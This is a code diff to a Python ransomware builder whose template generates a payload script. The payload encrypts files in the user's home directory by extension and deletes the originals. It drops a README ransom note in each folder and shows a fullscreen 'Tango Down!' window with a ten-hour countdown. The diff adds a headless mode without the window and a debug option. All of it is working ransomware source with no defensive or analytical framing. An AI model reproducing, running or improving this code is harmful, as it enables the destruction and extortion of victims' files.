@@ -1,6 +1,6 @@
 import platform
 
-def create_demon(host, port, fullscreen, demo, ghost, msg, img_base64):
+def create_demon(host, port, fullscreen, demo, ghost, msg, img_base64, mode, debug):
     demon = """#/usr/bin/env python3
 import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, base64
 <import_pil>
@@ -11,59 +11,7 @@ from io import BytesIO
 <import_random>
 <import_aes>
 
-class mainwindow(Tk):
-    def __init__(self):
-        Tk.__init__(self)
-        self.title(string = "Tango Down!") # Set window title
-        self.resizable(0,0) # Do not allow to be resized
-        self.configure(background='black')
-        self.overrideredirect(True)
-        <fullscreen>
-
-        photo_code = '''<img_base64>
-'''
-
-        <load_image>
-
-        label = Label(self, image=photo, background = 'black')
-        label.image = photo # keep a reference!
-        label.grid(row = 5, column = 0, rowspan = 2)
-        label = Label(self, image=photo, background = 'black')
-        label.image = photo # keep a reference!
-        label.grid(row = 5, column = 3, rowspan = 2)
-
-        message = '''<message>
-'''
-        Label(self, text = message, font='Helvetica 16 bold', foreground = 'white', background = 'red').grid(row = 0, column = 0, columnspan = 4)
-
-        Label(self, text = '', font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 5, column = 2)
-        Label(self, text = '', font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 6, column = 2)
-
-
-        def start_thread():
-            # Start timer as thread
-            thread = threading.Thread(target=start_timer)
-            thread.daemon = True
-            thread.start()
-
-        def start_timer():
-            Label(self, text = 'TIME LEFT:', font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 5, column = 0, columnspan = 4)
-            try:
-                s = 36000 # 10 hours
-                while s:
-                    min, sec = divmod(s, 60)
-                    time_left = '{:02d}:{:02d}'.format(min, sec)
-
-                    Label(self, text = time_left, font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 6, column = 0, columnspan = 4)
-                    time.sleep(1)
-                    s -= 1
-            except KeyboardInterrupt:
-                print('Closed...')
-
-        if platform == 'Windows':
-            pass
-        else:
-            start_thread()
+<gui>
 
 def getlocalip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -125,6 +73,8 @@ def get_target():
         sys.exit(1) # Cannot find users home directory.
 
 def start_encrypt(p, key):
+    message = '''<message>
+'''
     c = 0
 
     if platform == 'Windows':
@@ -146,8 +96,13 @@ def start_encrypt(p, key):
                     for i in ext:
                         if name.endswith(i.lower()):
                             encrypt_file(os.path.join(path, name), key)
+                            <debug>
                             c +=1
                             os.remove(os.path.join(path, name))
+
+                with open(path + '/README.txt', 'w') as f:
+                    f.write(message)
+                    f.close()
 
         #os.remove(sys.argv[0]) # destroy encrypter when finished
     except Exception as e:
@@ -165,14 +120,13 @@ def connector():
 
         <encrypt>
 
-        main = mainwindow()
-        main.mainloop()
+        <start_gui>
 
     except Exception as e:
         # Do not send key, encrypt anyway.
         <encrypt>
-        main = mainwindow()
-        main.mainloop()
+        <start_gui>
+        pass
 
 try:
     connector()
@@ -181,9 +135,82 @@ except KeyboardInterrupt:
 
     """
 
+    gui = """
+class mainwindow(Tk):
+    def __init__(self):
+        Tk.__init__(self)
+        self.title(string = "Tango Down!") # Set window title
+        self.resizable(0,0) # Do not allow to be resized
+        self.configure(background='black')
+        self.overrideredirect(True)
+        <fullscreen>
+
+        photo_code = '''<img_base64>
+'''
+
+        <load_image>
+
+        label = Label(self, image=photo, background = 'black')
+        label.image = photo # keep a reference!
+        label.grid(row = 5, column = 0, rowspan = 2)
+        label = Label(self, image=photo, background = 'black')
+        label.image = photo # keep a reference!
+        label.grid(row = 5, column = 3, rowspan = 2)
+
+        message = '''<message>
+'''
+        Label(self, text = message, font='Helvetica 16 bold', foreground = 'white', background = 'red').grid(row = 0, column = 0, columnspan = 4)
+
+        Label(self, text = '', font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 5, column = 2)
+        Label(self, text = '', font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 6, column = 2)
+
+
+        def start_thread():
+            # Start timer as thread
+            thread = threading.Thread(target=start_timer)
+            thread.daemon = True
+            thread.start()
+
+        def start_timer():
+            Label(self, text = 'TIME LEFT:', font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 5, column = 0, columnspan = 4)
+            try:
+                s = 36000 # 10 hours
+                while s:
+                    min, sec = divmod(s, 60)
+                    time_left = '{:02d}:{:02d}'.format(min, sec)
+
+                    Label(self, text = time_left, font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 6, column = 0, columnspan = 4)
+                    time.sleep(1)
+                    s -= 1
+            except KeyboardInterrupt:
+                print('Closed...')
+
+        if platform == 'Windows':
+            pass
+        else:
+            start_thread()
+"""
+
+    start_gui = """main = mainwindow()
+        main.mainloop()"""
+
+    if mode == 1:
+        demon = demon.replace('<gui>', gui)
+        demon = demon.replace('<start_gui>', start_gui)
+    elif mode == 2:
+        demon = demon.replace('<import_pil>', '')
+        demon = demon.replace('<gui>', '')
+        demon = demon.replace('<start_gui>', '')
+
+
     # Input settings by replacing it
     demon = demon.replace("<host>", host)
     demon = demon.replace('<port>', str(port))
+
+    if debug == 0:
+        demon = demon.replace('<debug>', '')
+    elif debug == 1:
+        demon = demon.replace('<debug>', "print('[ENCRYPTED] %s' % name)")
 
     if fullscreen == 1:
         # Insert fullscreen code
